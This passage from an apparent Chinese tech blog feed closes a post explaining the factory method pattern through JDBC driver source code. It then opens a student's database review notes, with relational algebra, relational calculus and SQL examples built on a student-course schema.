<p>至于数据库方如何实现<code>java</code>与自身数据库的连接，具体过程就更不需要用户知道。用户只需要知道通过<code>com.mysql.jdbc.Driver</code>这个具体工厂，可以得到连接<code>mysql</code>的连接类即可。然后，通过这个连接类(产品)，用户便可以与<code>mysql</code>数据库进行交互了。</p>
<p>由于，市面上不止<code>mysql</code>一家数据库，还有<code>SQL Server</code>、<code>Oracle</code>等不错的数据库。如果用户想用其它数据库，那就跟小明在不同时空下想购买不同衣服一样，只需要找到对应的具体工厂(数据库驱动类)，就能得到具体产品(数据库连接类)。这两个都由各数据库来实现。</p>
<p>而用户根据自身情况从不同的具体工厂(数据库驱动类)，获取不同的产品，只需要导入并注册不同的数据库驱动类即可，其它都不需要修改，<a href="https://www.cnblogs.com/kabi/p/5182809.html">示例博客</a>。</p>
<h4 id="深入源码"><a href="#深入源码" class="headerlink" title="深入源码"></a>深入源码</h4><p>深入<code>java.sql</code>和<code>com.mysql.jdbc</code>，找到工厂方法<code>getConnection()</code>的源码在<code>java.sql.DriverManage</code>类中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> aDriver.driver.connect(url, info);</span><br></pre></td></tr></table></figure>

<p>这行代码调用<strong>注册的数据库驱动类</strong>中的<code>connect()</code>方法，于是再找到<code>com.mysql.jdbc.Driver</code>类的父类<code>com.mysql.jdbc.NonRegisteringDriver</code>(实现了<code>java.sql.Driver</code>接口)中的<code>connect()</code>方法，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Connection <span class="title function_">connect</span><span class="params">(String url, Properties info)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (url == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> SQLError.createSQLException(Messages.getString(<span class="string">&quot;NonRegisteringDriver.1&quot;</span>), <span class="string">&quot;08001&quot;</span>, (ExceptionInterceptor)<span class="literal">null</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (StringUtils.startsWithIgnoreCase(url, <span class="string">&quot;jdbc:mysql:loadbalance://&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.connectLoadBalanced(url, info);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (StringUtils.startsWithIgnoreCase(url, <span class="string">&quot;jdbc:mysql:replication://&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.connectReplicationConnection(url, info);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> ((props = <span class="built_in">this</span>.parseURL(url, info)) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="string">&quot;1&quot;</span>.equals(props.getProperty(<span class="string">&quot;NUM_HOSTS&quot;</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.connectFailover(url, info);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                com.mysql.jdbc.<span class="type">Connection</span> <span class="variable">newConn</span> <span class="operator">=</span> ConnectionImpl.getInstance(<span class="built_in">this</span>.host(props), <span class="built_in">this</span>.port(props), props, <span class="built_in">this</span>.database(props), url);</span><br><span class="line">                <span class="keyword">return</span> newConn;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> var6;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">                <span class="type">SQLException</span> <span class="variable">sqlEx</span> <span class="operator">=</span> SQLError.createSQLException(Messages.getString(<span class="string">&quot;NonRegisteringDriver.17&quot;</span>) + var7.toString() + Messages.getString(<span class="string">&quot;NonRegisteringDriver.18&quot;</span>), <span class="string">&quot;08001&quot;</span>, (ExceptionInterceptor)<span class="literal">null</span>);</span><br><span class="line">                sqlEx.initCause(var7);</span><br><span class="line">                <span class="keyword">throw</span> sqlEx;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到工厂方法并非简单返回一个具体产品(数据库连接类)即可，而是需要进行多层的包装和处理，才能返回给用户。</p>
<p>所以，这就解释了为什么不直接告诉用户<code>com.mysql.jdbc.Connection</code>类，让用户自己实例化具体产品(<code>new com.mysql.jdbc.Connection(&quot;&quot;)</code>)，而是要通过具体工厂来返回这个实例化的具体产品。当然，其原因不止如此。。。</p>
<p>总而言之，工厂方法模式在框架开发、多人协作的方面有着广泛的应用，大大降低了各模块之间的耦合性。</p>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>软件工程</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库复习小记</title>
    <url>/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>大三下，只剩一门数据库原理课程考试了，趁复习之际，我打算对数据库内容知识进行简单总结。</p>
<p>实习面试时，曾倍受不懂数据库之苦。虽然以前接触过MySQL等数据库，但并没有深入了解和研究，对其原理更是雾里看花。</p>
<p>而随着数据库原理课程步步深入的讲解，才终于揭开数据库神秘的面纱。</p>
<span id="more"></span>

<p>贯彻全文例子的数据表：</p>
<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/4.png" alt="1"></p>
<h2 id="1-关系数据库"><a href="#1-关系数据库" class="headerlink" title="1. 关系数据库"></a>1. 关系数据库</h2><p><strong>关系数据库（Relational database）</strong>，是创建在关系模型基础上的数据库，借助于<strong>集合代数</strong>等数学概念和方法来处理数据库中的数据。</p>
<p>它于1970年由<strong>埃德加·科德（E.F.Codd）</strong>提出，开创了数据库系统的新纪元。</p>
<p>当今，很多传统数据库，都属于关系数据库，比如：MySQL、Oracle等。而redis等新型数据库，则是非关系型数据库。</p>
<p>关系模型分为三部分：</p>
<ul>
<li>关系数据结构</li>
<li>关系操作集合</li>
<li>关系完整性约束</li>
</ul>
<h3 id="1-1-关系"><a href="#1-1-关系" class="headerlink" title="1.1. 关系"></a>1.1. 关系</h3><p>关系模型的数据结构非常简单，即<strong>关系</strong>——一张扁平的二维表。</p>
<p>关系的定义如下：</p>
<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/1.png" alt="1"></p>
<ul>
<li>关系的目或度<code>n</code>，即为二维表的列属性；</li>
<li>关系的元组<code>t</code>，即为二维表的行。</li>
</ul>
<h3 id="1-2-关系操作"><a href="#1-2-关系操作" class="headerlink" title="1.2. 关系操作"></a>1.2. 关系操作</h3><p>增删改查，其中查询最为关键和复杂。</p>
<p>早期的关系查询操作通常用<strong>代数方式</strong>或<strong>逻辑方式</strong>表示，分别称为<strong>关系代数</strong>和<strong>关系演算</strong>。</p>
<p>后来，出现了一种介于关系代数和关系演算之间的<strong>结构化查询语言（SQL）</strong>。</p>
<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/2.png" alt="1"></p>
<h3 id="1-3-关系的完整性"><a href="#1-3-关系的完整性" class="headerlink" title="1.3. 关系的完整性"></a>1.3. 关系的完整性</h3><p>关系模型的完整性约束分为三类：</p>
<ul>
<li>实体完整性，即主键。</li>
<li>参照完整性，即外键。</li>
<li>用户定义的完整性，即<code>NOT NULL</code>等。</li>
</ul>
<h3 id="1-4-关系代数"><a href="#1-4-关系代数" class="headerlink" title="1.4. 关系代数"></a>1.4. 关系代数</h3><p>关系代数是一种抽象的查询语言，用对关系的运算来表达查询。其运算符如下：</p>
<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/3.png" alt="1"></p>
<p>具体知识点不予介绍，关系代数示例如下：</p>
<ul>
<li>1 查询年龄不等于20岁的学生信息</li>
</ul>
<p>$\sigma_{Sage!&#x3D;20}(Student)$</p>
<ul>
<li>2 查询选修1号课程的学生学号</li>
</ul>
<p>$\pi_{Sno}(\sigma_{Cno&#x3D;1}(SC))$</p>
<ul>
<li>3 查询既选修1号课程又选修2号课程的学生学号</li>
</ul>
<p>$\pi_{Sno}(\sigma_{Cno&#x3D;1}(SC)) \bigcap \pi_{Sno}(\sigma_{Cno&#x3D;2}(SC))$</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">select</span> sno <span class="keyword">from</span> sc <span class="keyword">where</span> cno<span class="operator">=</span><span class="number">1</span>)</span><br><span class="line"><span class="keyword">intersect</span></span><br><span class="line">(<span class="keyword">select</span> sno <span class="keyword">from</span> sc <span class="keyword">where</span> cno<span class="operator">=</span><span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>4 查询不选1号课程的学生学号</li>
</ul>
<p>$\pi_{Sno}(Student) - \pi_{Sno}(\sigma_{Cno&#x3D;1}(SC))$</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sno <span class="keyword">from</span> student</span><br><span class="line">minus</span><br><span class="line"><span class="keyword">select</span> sno <span class="keyword">from</span> sc <span class="keyword">where</span> cno<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>查询所有课程成绩大于等于85分的学生学号</p>
<p>$\pi_{Sno}(SC) - \pi_{Sno}(\sigma_{Grade&lt;85}(SC))$</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">select</span> sno <span class="keyword">from</span> sc)</span><br><span class="line">minus</span><br><span class="line">(<span class="keyword">select</span> sno <span class="keyword">from</span> sc <span class="keyword">where</span> grade <span class="operator">&lt;</span> <span class="number">85</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>5 查询选修1号课程的学生学号和姓名</li>
</ul>
<p>$\pi_{Sno,Sname}(\sigma_{Cno&#x3D;1}(SC \times Student)$</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> student.sno, student.sname</span><br><span class="line"><span class="keyword">from</span> sc <span class="keyword">cross</span> <span class="keyword">join</span> student</span><br><span class="line"><span class="keyword">where</span> sc.cno<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>$\pi_{Sno,Sname}(\sigma_{Cno&#x3D;1}(SC \bowtie Student))$</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> student.sno, student.sname</span><br><span class="line"><span class="keyword">from</span> sc <span class="keyword">join</span> student <span class="keyword">on</span> sc.sno<span class="operator">=</span>student.sno</span><br><span class="line"><span class="keyword">where</span> cno<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>6 查询所有选课成绩均及格的学生学号和姓名</li>
</ul>
<p>$\pi_{Sno,Sname}(\sigma_{Grade \geq 60}(SC \bowtie Student))$</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sno, sname <span class="keyword">from</span> student <span class="keyword">natural</span> <span class="keyword">join</span> sc <span class="keyword">where</span> grade <span class="operator">&gt;=</span> <span class="number">60</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>7 查询选修了全部课程的学生学号和姓名</li>
</ul>
<p>$(\pi_{Sno,Cno}(SC) \div \pi_{Cno}(Course)) \bowtie \pi_{Sno, Sname}(Student)$</p>
<ul>
<li>8 查询至少选修2门不同课程的学生学号</li>
</ul>
<p>$\pi_{Sno}(\sigma_{SC1.Sno &#x3D; SC2.Sno \bigwedge SC1.Cno!&#x3D;SC2.Cno}(SC1 \times SC2))$</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sno, <span class="built_in">count</span>(cno) con_count</span><br><span class="line"><span class="keyword">from</span> SC</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> sno</span><br><span class="line"><span class="keyword">having</span> <span class="built_in">count</span>(cno) <span class="operator">&gt;=</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>9 查询选课成绩最高的学生学号和成绩</li>
</ul>
<p>$X &#x3D; \pi_{Grade}(SC) - \pi_{SC1.Grade}(SC1 \bowtie_{SC1.Grade &lt; SC2.Grade} SC2)$<br>$\pi_{Sno, Grade}(X \bowtie SC)$</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sno, grade</span><br><span class="line"><span class="keyword">from</span> SC</span><br><span class="line"><span class="keyword">where</span> grade<span class="operator">=</span>(</span><br><span class="line">    <span class="keyword">select</span> <span class="built_in">max</span>(grade) <span class="keyword">from</span> SC</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ul>
<li>1 查询所有男同学的信息</li>
</ul>
<p>$\sigma_{Ssex&#x3D;’男’}(Student)$</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> ssex<span class="operator">=</span><span class="string">&#x27;男&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>2 查询选修1号或2号课程的学生选课信息</li>
</ul>
<p>$\sigma_{Cno&#x3D;1 \bigvee Cno&#x3D;2}(SC)$</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sc <span class="keyword">where</span> cno<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> cno<span class="operator">=</span><span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>3 查询计算机系（CS）的男同学的学号和姓名</li>
</ul>
<p>$\pi_{Sno, Sname}(\sigma_{Ssex&#x3D;’男’ \bigwedge Sdept&#x3D;’CS’}(Student)))$</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sno, sname <span class="keyword">from</span> student <span class="keyword">where</span> ssex<span class="operator">=</span><span class="string">&#x27;男&#x27;</span> <span class="keyword">and</span> sdept<span class="operator">=</span><span class="string">&#x27;CS&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>4 查询选修“数据库”课程的学生学号</li>
</ul>
<p>$\pi_{Sno}(\sigma_{Cname&#x3D;’数据库’}(Course \bowtie SC))$</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sno</span><br><span class="line"><span class="keyword">from</span> Course <span class="keyword">join</span> SC <span class="keyword">on</span> Course.cno<span class="operator">=</span>SC.cno</span><br><span class="line"><span class="keyword">where</span> Course.cname<span class="operator">=</span><span class="string">&#x27;数据库&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>5 查询选修“数据库”课程的学生学号和姓名</li>
</ul>
<p>$\pi_{Sno, Sname}(\sigma_{Cname&#x3D;’数据库’}(Course \bowtie SC \bowtie Student))$</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sno,sname</span><br><span class="line"><span class="keyword">from</span> course <span class="keyword">natural</span> <span class="keyword">join</span> sc <span class="keyword">natural</span> <span class="keyword">join</span> student</span><br><span class="line"><span class="keyword">where</span> cname<span class="operator">=</span><span class="string">&#x27;数据库&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>6 查询没有选修全部课程的学生学号</li>
</ul>
<p>$\pi_{Sno}(\pi_{Sno,Cno}(Student \times Course) - \pi_{Sno,Cno}(SC))$</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> sno <span class="keyword">from</span></span><br><span class="line">(<span class="keyword">select</span> sno, cno <span class="keyword">from</span> student <span class="keyword">cross</span> <span class="keyword">join</span> course</span><br><span class="line">minus</span><br><span class="line"><span class="keyword">select</span> sno, cno <span class="keyword">from</span> sc);</span><br></pre></td></tr></table></figure>

<p>$\pi_{Sno}(Student) - (\pi_{Sno, Cno}(SC) \div \pi_{Cno}(Course))$</p>
<ul>
<li>7 查询没有选修全部课程的学生学号和姓名</li>
</ul>
<p>$\pi_{Sno}(\pi_{Sno,Cno}(Student \times Course) - \pi_{Sno,Cno}(SC)) \bowtie \pi_{Sno, Sname}(Student)$</p>
<p>$(\pi_{Sno}(Student) - (\pi_{Sno, Cno}(SC) \div \pi_{Cno}(Course))) \bowtie \pi_{Sno, Sname}(Student)$</p>
<h3 id="1-5-关系演算"><a href="#1-5-关系演算" class="headerlink" title="1.5. 关系演算"></a>1.5. 关系演算</h3><p>关系演算则以数理逻辑中的谓词演算为基础。</p>
<p>具体内容不做介绍。示例如下：</p>
<ul>
<li>1 试用元组关系演算语言ALPHA完成：查询计算机系（CS）的男同学的学号和姓名</li>
</ul>
<p>$GET \ W (Student.Sno, Student.Sname): Student.Sdept&#x3D;’CS’ \bigwedge Student.Ssex&#x3D;’男’$</p>
<ul>
<li>2 试用元组关系演算语言ALPHA完成：查询选修“数据库”课程的学生学号</li>
</ul>
<p>$RANGE \ Course \ CX$<br>$GET \ W (SC.Sno): \exists CX (CX.Cno&#x3D;SC.Cno \bigwedge CX.Cname&#x3D;’数据库’)$</p>
<ul>
<li>3 试用元组关系演算语言ALPHA完成：查询所有选课成绩均及格的学生学号和姓名</li>
</ul>
<p>$RANGE \ SC \ SCX$<br>$GET \ W (Student.Sno, Student.Sname): \forall SCX (SCX.Sno&#x3D;Student.Sno \Longrightarrow SCX.Grade&gt;&#x3D;60)$</p>
<p>正确：</p>
<p>$RANGE \ SC \ SCX$<br>$GET \ W (Student.Sno, Student.Sname): \exist SCX (SCX.Sno &#x3D; Student.Sno) \bigwedge \forall SCX (SCX.Sno&#x3D;Student.Sno \Longrightarrow SCX.Grade&gt;&#x3D;60)$</p>
<ul>
<li>4 试用元组关系演算语言ALPHA完成：查询有两个人以上选修的课程号和课程名</li>
</ul>
<p>$RANGE \ SC \ SCX$<br>$\quad \quad \quad \quad \ SC \ SCY$<br>$GET \ W (Course.Cno, Course.Cname): \exist SCX \ \exist SCY (SCX.Cno&#x3D;Course.Cno \bigwedge SCY.Cno&#x3D;SCX.Cno \bigwedge SCX.Sno \neq SCY.Sno)$</p>
<h2 id="2-关系数据库标准语言-SQL"><a href="#2-关系数据库标准语言-SQL" class="headerlink" title="2. 关系数据库标准语言 SQL"></a>2. 关系数据库标准语言 SQL</h2><h3 id="2-1-数据定义"><a href="#2-1-数据定义" class="headerlink" title="2.1. 数据定义"></a>2.1. 数据定义</h3><p>包括模式（库）、表、视图、索引的增删改：</p>
<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/5.png" alt="1"></p>
<h3 id="2-2-数据查询"><a href="#2-2-数据查询" class="headerlink" title="2.2. 数据查询"></a>2.2. 数据查询</h3><p>主要为<code>select</code>语句，<code>select</code>为SQL语句的重中之重，包括<strong>单表查询</strong>、<strong>连接查询</strong>、<strong>嵌套查询</strong>、<strong>集合查询</strong>、<strong>基于派生表查询</strong>等主要内容。</p>
<p>其一般格式如下：</p>
<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/6.png" alt="1"><br><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/7.png" alt="1"></p>
<h3 id="2-3-数据更新"><a href="#2-3-数据更新" class="headerlink" title="2.3. 数据更新"></a>2.3. 数据更新</h3><p>主要为<code>insert</code>、<code>update</code>、<code>delete</code>语句。</p>
<p>较为简单，不予详说。</p>
<h3 id="2-4-视图"><a href="#2-4-视图" class="headerlink" title="2.4. 视图"></a>2.4. 视图</h3><p>视图是建立在查询语句上的一张虚拟表，可直接查询视图，查询时会自动执行视图定义中的查询语句。</p>
<p>视图可以有创建、增删改查操作。</p>
<p>视图创建格式如下：</p>
<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/8.png" alt="1"></p>
<p>增删改查则与普通表相同。</p>
<h3 id="2-5-SQL-示例"><a href="#2-5-SQL-示例" class="headerlink" title="2.5. SQL 示例"></a>2.5. SQL 示例</h3><h4 id="2-5-1-SQL定义功能、数据插入"><a href="#2-5-1-SQL定义功能、数据插入" class="headerlink" title="2.5.1. SQL定义功能、数据插入"></a>2.5.1. SQL定义功能、数据插入</h4><h5 id="2-5-1-1-建立教学数据库的三个基本表"><a href="#2-5-1-1-建立教学数据库的三个基本表" class="headerlink" title="2.5.1.1. 建立教学数据库的三个基本表"></a>2.5.1.1. 建立教学数据库的三个基本表</h5><p>S(Sno,Sname,Sgender,Sage,Sdept) 学生（学号，姓名，性别，年龄，系）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> S (</span><br><span class="line">   Sno <span class="type">char</span>(<span class="number">9</span>) <span class="keyword">primary</span> key,</span><br><span class="line">   Sname <span class="type">char</span>(<span class="number">20</span>) <span class="keyword">unique</span>,</span><br><span class="line">   Ssex <span class="type">char</span>(<span class="number">2</span>),</span><br><span class="line">   Sage <span class="type">smallint</span>,</span><br><span class="line">   Sdept <span class="type">char</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>SC(Sno,Cno,Grade) 选课（学号，课程号，成绩）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> SC (</span><br><span class="line">   Sno <span class="type">char</span>(<span class="number">9</span>),</span><br><span class="line">   Cno <span class="type">char</span>(<span class="number">4</span>),</span><br><span class="line">   Grade <span class="type">smallint</span>,</span><br><span class="line">   <span class="keyword">primary</span> key (Sno, Cno),</span><br><span class="line">   <span class="keyword">foreign</span> key (Sno) <span class="keyword">references</span> S(Sno),</span><br><span class="line">   <span class="keyword">foreign</span> key (Cno) <span class="keyword">references</span> C(Cno)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>C(Cno,Cname,Cpno,Ccredit) 课程（课程号，课程名，先行课，学分）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> C (</span><br><span class="line">   Cno <span class="type">char</span>(<span class="number">4</span>) <span class="keyword">primary</span> key,</span><br><span class="line">   Cname <span class="type">char</span>(<span class="number">40</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">   Cpno <span class="type">char</span>(<span class="number">4</span>),</span><br><span class="line">   Ccredit <span class="type">smallint</span>,</span><br><span class="line">   <span class="keyword">foreign</span> key(Cpno) <span class="keyword">references</span> C(Cno)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h5 id="2-5-1-2-DROP-TABLE、ALTER-TABLE、CREATE-INDEX、DROP-INDEX-及INSERT语句输入数据"><a href="#2-5-1-2-DROP-TABLE、ALTER-TABLE、CREATE-INDEX、DROP-INDEX-及INSERT语句输入数据" class="headerlink" title="2.5.1.2. DROP TABLE、ALTER TABLE、CREATE INDEX、DROP INDEX 及INSERT语句输入数据"></a>2.5.1.2. DROP TABLE、ALTER TABLE、CREATE INDEX、DROP INDEX 及INSERT语句输入数据</h5><p>删除表：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> SC;</span><br></pre></td></tr></table></figure>

<p>修改表：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> C <span class="keyword">ADD</span> <span class="keyword">UNIQUE</span>(Cname);</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> S MODIFY(Ssex <span class="type">char</span>(<span class="number">4</span>));</span><br></pre></td></tr></table></figure>

<p>创建索引：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">UNIQUE</span> INDEX SCno <span class="keyword">ON</span> SC(Sno <span class="keyword">ASC</span>, Cno <span class="keyword">DESC</span>);</span><br></pre></td></tr></table></figure>

<p>删除索引：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> INDEX SCno;</span><br></pre></td></tr></table></figure>

<p>插入数据：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> S <span class="keyword">values</span>(<span class="number">201215121</span>,<span class="string">&#x27;李勇&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="number">20</span>,<span class="string">&#x27;CS&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> S <span class="keyword">values</span>(<span class="number">201215122</span>,<span class="string">&#x27;刘晨&#x27;</span>,<span class="string">&#x27;女&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;CS&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> S <span class="keyword">values</span>(<span class="number">201215123</span>,<span class="string">&#x27;王敏&#x27;</span>,<span class="string">&#x27;女&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;MA&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> S <span class="keyword">values</span>(<span class="number">201215125</span>,<span class="string">&#x27;张立&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;IS&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> C <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">&#x27;数学&#x27;</span>,<span class="keyword">null</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> C <span class="keyword">values</span>(<span class="number">6</span>,<span class="string">&#x27;数据处理&#x27;</span>,<span class="keyword">null</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> C <span class="keyword">values</span>(<span class="number">7</span>,<span class="string">&#x27;PASCAL语言&#x27;</span>,<span class="number">6</span>,<span class="number">4</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> C <span class="keyword">values</span>(<span class="number">5</span>,<span class="string">&#x27;数据结构&#x27;</span>,<span class="number">7</span>,<span class="number">4</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> C <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;数据库&#x27;</span>,<span class="number">5</span>,<span class="number">4</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> C <span class="keyword">values</span>(<span class="number">3</span>,<span class="string">&#x27;信息系统&#x27;</span>,<span class="number">1</span>,<span class="number">4</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> C <span class="keyword">values</span>(<span class="number">4</span>,<span class="string">&#x27;操作系统&#x27;</span>,<span class="number">6</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> SC <span class="keyword">values</span>(<span class="number">201215121</span>,<span class="number">1</span>,<span class="number">92</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> SC <span class="keyword">values</span>(<span class="number">201215121</span>,<span class="number">2</span>,<span class="number">85</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> SC <span class="keyword">values</span>(<span class="number">201215121</span>,<span class="number">3</span>,<span class="number">88</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> SC <span class="keyword">values</span>(<span class="number">201215122</span>,<span class="number">2</span>,<span class="number">90</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> SC <span class="keyword">values</span>(<span class="number">201215122</span>,<span class="number">3</span>,<span class="number">80</span>);</span><br></pre></td></tr></table></figure>

<h4 id="2-5-2-数据查询"><a href="#2-5-2-数据查询" class="headerlink" title="2.5.2. 数据查询"></a>2.5.2. 数据查询</h4><h5 id="2-5-2-1．查询选修1号课程的学生学号与姓名"><a href="#2-5-2-1．查询选修1号课程的学生学号与姓名" class="headerlink" title="2.5.2.1．查询选修1号课程的学生学号与姓名"></a>2.5.2.1．查询选修1号课程的学生学号与姓名</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> S.Sno, S.Sname</span><br><span class="line"><span class="keyword">from</span> S, SC</span><br><span class="line"><span class="keyword">where</span> S.Sno<span class="operator">=</span>SC.Sno <span class="keyword">and</span> SC.Cno<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>

